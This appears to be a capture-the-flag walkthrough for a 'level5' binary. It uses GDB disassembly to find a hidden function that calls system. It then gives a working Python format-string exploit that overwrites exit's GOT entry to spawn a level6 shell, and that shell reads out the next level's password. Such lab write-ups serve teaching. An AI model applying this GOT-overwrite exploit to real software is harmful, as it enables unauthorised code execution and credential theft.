# Level 5

First step - testing the program
```
$ ./level5
Hello
Hello
```
The program wait an input and print it

Start it in GDB
```
(gdb-peda)$ disas main
Dump of assembler code for function main:
   0x08048504 <+0>:		push   ebp
   0x08048505 <+1>:		mov    ebp,esp
   0x08048507 <+3>:		and    esp,0xfffffff0
   0x0804850a <+6>:		call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.
```

The main call a function `n`
```
(gdb-peda)$ disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:		push   ebp
   0x080484c3 <+1>:		mov    ebp,esp
   0x080484c5 <+3>:		sub    esp,0x218
   0x080484cb <+9>:		mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```
Just a fgets and a call to `printf` for print the buffer and `exit`

Let's see all the functions
```
(gdb-peda)$ info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf@plt
0x08048390  _exit@plt
0x080483a0  fgets@plt
0x080483b0  system@plt
0x080483c0  __gmon_start__@plt
0x080483d0  exit@plt
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

There is a non-called `o` function
```
(gdb-peda)$ disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:		push   ebp
   0x080484a5 <+1>:		mov    ebp,esp
   0x080484a7 <+3>:		sub    esp,0x18
   0x080484aa <+6>:		mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```

---

The function call `system` and `exit`


We have to call this function using a format string attack and overwrite the Global Offset Table

Search stack's buffer position 
```
$ python -c 'print "AAAABBBB"+" %x"*10' | ./level5
AAAABBBB 200 b7fd1ac0 b7ff37d0 41414141 42424242 20782520 25207825 78252078 20782520 25207825
```
It is at 4th position.

Now we have to find the address of `o` function 
```
gdb-peda$ x o
0x80484a4 <o>:	0x83e58955
```

And the address of `exit` function in the GOT.PLT
```
gdb-peda$ x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
```
So, we can build our script for replace `exit address` in PLT with `address of o function`

```
#!/usr/bin/python

import struct

FT_O = 0x80484a4
PLT_EXIT = 0x8049838

FT_O_DECI = 134513828

FT_O_P1_DECI = 33956 #84a4-8
FT_O_P2_DECI = 33632

def pad(s):
    return s+"X"*(512-len(s))

EXPLOIT = struct.pack("I", PLT_EXIT)
EXPLOIT += struct.pack("I", PLT_EXIT+2)
EXPLOIT += "%4$33948x"
EXPLOIT += "%4$n"
EXPLOIT += "%33632x"
EXPLOIT += "%5$n"

print pad(EXPLOIT)
```

Let's start 
```
./exploit.py > payload
cat payload - | ./level5
```

```
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
---

ressources : 
```
PLT and GOT - the key to code sharing and dynamic libraries
https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html

Reversing Linux : Comprendre le rôle des sections PLT et GOT dans l’édition de liens dynamique
https://www.segmentationfault.fr/linux/role-plt-got-ld-so/

Global Offset Table (GOT) and Procedure Linkage Table (PLT) - bin 0x12
https://www.youtube.com/watch?v=kUk5pw4w0h4

Format String Exploit and overwrite the Global Offset Table - bin 0x13
https://www.youtube.com/watch?v=t1LH9D5cuK4
```
